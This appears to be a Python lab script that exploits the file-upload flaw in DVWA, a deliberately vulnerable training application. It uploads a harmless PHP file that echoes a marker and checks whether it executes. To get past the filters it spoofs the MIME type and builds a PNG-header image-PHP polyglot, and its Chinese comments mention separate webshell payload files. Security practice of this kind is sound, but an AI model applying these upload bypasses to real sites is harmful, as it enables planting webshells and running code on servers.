from dvwa import DVWA, pre_blocks

SECURITY = "low"
PAYLOAD = b'<?php echo "upload-ok"; ?>'
PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64
"""
会在服务器上写文件, 用完自己删掉 hackable/uploads 里的测试文件.
手工测试可以直接用 payloads/shellExe.php 和 payloads/inject.php.
Low: 任意文件
Medium: 只校验 Content-Type 和大小, 把 php 伪装成 image/jpeg
High: 校验扩展名加 getimagesize, php 会被拒绝, 只能传图片马
"""

target = DVWA("upload", SECURITY)

if SECURITY == "low":
    name, data, mime = (
        "poc.php",
        PAYLOAD,
        "application/x-php",
    )
elif SECURITY == "medium":
    name, data, mime = "poc.php", PAYLOAD, "image/jpeg"
else:
    name, data, mime = (
        "poc.php.jpg",
        PNG + PAYLOAD,
        "image/png",
    )

response = target.post(
    "",
    data={"Upload": "Upload"},
    files={"uploaded": (name, data, mime)},
)
blocks = pre_blocks(response.text)
print(blocks[-1] if blocks else "No response.")

url = f"{target.base_url}/hackable/uploads/{name}"
print(f"Check: {url}")

if SECURITY == "high":
    print(
        "High 只接受 jpg / png, 文件会按图片保存, 不会当 php 执行."
    )
else:
    check = target.get(url)
    print(f"Executed: {'upload-ok' in check.text}")
